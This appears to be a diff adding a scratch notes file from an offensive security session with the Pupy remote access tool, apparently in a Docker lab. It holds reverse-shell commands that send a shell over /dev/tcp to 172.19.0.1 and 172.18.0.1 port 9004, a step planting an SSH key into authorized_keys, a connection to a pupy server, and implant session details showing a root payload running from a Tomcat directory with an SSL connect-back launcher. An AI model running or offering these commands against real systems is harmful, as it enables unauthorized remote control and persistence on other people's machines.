@@ -1,0 +1,40 @@
+set CMD 'sh -I >& /dev/tcp/172.19.0.1/9004 0>&1'
+
+172.19.0.1 
+
+12: br-90f33d1ec4ef: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:ce:fc:a9:8d brd ff:ff:ff:ff:ff:ff
+    inet 172.19.0.1/16 brd 172.19.255.255 scope global br-90f33d1ec4ef
+       valid_lft forever preferred_lft forever
+    inet6 fe80::42:ceff:fefc:a98d/64 scope link proto kernel_ll 
+       valid_lft forever preferred_lft forever
+
+
+cp ~/.ssh/id1_rsa.pub /tmp/projects/keys/authorized_keys
+
+ssh -I ~/.ssh/id1_rsa -p 2022 pupy@127.0.0.1
+
+
+set CMD 'sh -I >& /dev/tcp/172.18.0.1/9004 0>&1'
+
+hostname       fb989e2e61e6                                           
+user           root                                                   
+release        6.6.9-amd64                                            
+version        #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08)  
+cmdline        ./pupyx64.RygkKI.lin                                   
+os_arch        x86_64                                                 
+proc_arch      64bit                                                  
+pid            64                                                     
+exec_path      /usr/local/tomcat/pupyx64.RygkKI.lin                   
+cid            00000000453ce861                                       
+address        172.18.0.3                                             
+macaddr        02:42:ac:12:00:03                                      
+revision       ?                                                      
+node           0242ac120003                                           
+debug_logfile  ?                                                      
+native         True                                                   
+proxy          wpad                                                   
+external_ip    ?                                                      
+launcher       connect                                                
+launcher_args  -t ssl --host 172.18.0.2:8443                          
+platform       linux/amd64
